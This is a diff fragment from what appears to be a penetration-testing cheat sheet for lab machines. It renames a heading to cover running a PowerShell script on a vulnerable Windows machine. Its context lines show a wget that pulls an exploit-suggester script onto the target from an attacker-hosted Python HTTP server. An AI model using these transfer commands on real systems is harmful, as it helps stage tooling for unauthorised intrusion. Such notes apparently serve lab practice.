@@ -13,7 +13,7 @@ In vuln machine type :
 Example : 
 > wget 10.10.14.62:8000/les.sh
 
-### How to upload files to vuln windows machine
+### How to execute powershell script to vuln windows machine
 In your machine type : 
 > python -m SimpleHTTPServer
 
